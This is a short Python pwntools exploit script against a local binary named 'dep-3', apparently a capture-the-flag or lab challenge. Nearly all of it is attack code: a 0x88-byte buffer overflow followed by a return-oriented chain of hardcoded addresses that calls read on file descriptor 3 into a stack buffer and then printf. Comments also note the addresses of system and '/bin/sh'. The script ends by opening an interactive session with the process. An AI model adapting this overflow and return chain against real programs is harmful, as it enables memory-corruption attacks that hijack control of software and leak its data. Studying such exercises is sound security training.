#!/usr/bin/env python

from pwn import *

p = process("./dep-3")

# context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(p, 'b *input_func+47')

# address of system is 0xf7e39da0
# sys_addr = "\xa0\x9d\xe3\f7"
sys_addr = p32(0xf7e39da0)

# /bin/sh is stored at 0xf7f5aa0b
# sh = "\x0b\xaa\xf5\xf7"
sh = p32(0xf7f5aa0b)

buf = "A" * 0x88
some_func = p32(0x8048894)
# just an empty space on the stack at $esp - 0x200
stack_addr = p32(0xffffc290)
# printf(stack)
printf_addr = p32(0x804ede0)
#read(3, stack, 100)
read_addr = p32(0x806d2a0)

print(p.recv())

p.sendline(buf + "BBBB" +  some_func + read_addr + printf_addr + p32(3) + stack_addr + p32(100))

p.interactive()
